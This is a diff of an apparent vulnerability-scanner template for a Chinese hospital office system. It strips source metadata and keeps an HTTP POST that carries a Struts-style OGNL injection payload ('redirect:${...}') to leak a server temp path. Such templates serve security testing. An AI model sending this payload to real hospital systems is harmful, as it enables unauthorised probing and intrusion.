@@ -3,14 +3,8 @@ info:
   name: 东华医疗协同办公系统 s17
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xznzpkmg3214rpn4
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xznzpkmg3214rpn4
-    fofa: body="/skin/charmBlue/css/dialog.css"
 http:
 - raw:
   - 'POST /organization/getUserNameByLoginName.action HTTP/1.1
@@ -50,9 +44,7 @@ http:
     Content-Length: 63
 
 
-    redirect:${#application.get(''javax.servlet.context.tempdir'')}
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1718849780173-7aa728a5-582b-4073-b2d6-63584b5f44d2.png)'
+    redirect:${#application.get(''javax.servlet.context.tempdir'')}'
   redirects: false
   matchers:
   - status:
